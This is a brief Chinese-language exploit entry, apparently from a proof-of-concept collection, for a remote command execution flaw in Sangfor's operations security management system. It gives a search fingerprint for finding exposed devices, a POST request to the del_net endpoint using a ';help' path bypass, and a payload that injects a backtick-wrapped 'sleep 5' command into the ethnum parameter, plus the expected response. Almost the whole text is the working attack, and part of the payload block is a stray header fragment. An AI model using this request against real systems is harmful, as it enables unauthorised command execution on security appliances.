# 深信服运维安全管理系统del_net远程代码执行漏洞

深信服 ｜ 命令执行 ｜ —
- **指纹**：`body="/fort/login"`
- **请求**：`POST /fort/system;help/netConfig/del_net HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
ethnum=%60sleep%205%60&IPV=255.255.255.1
```
- **响应特征**：200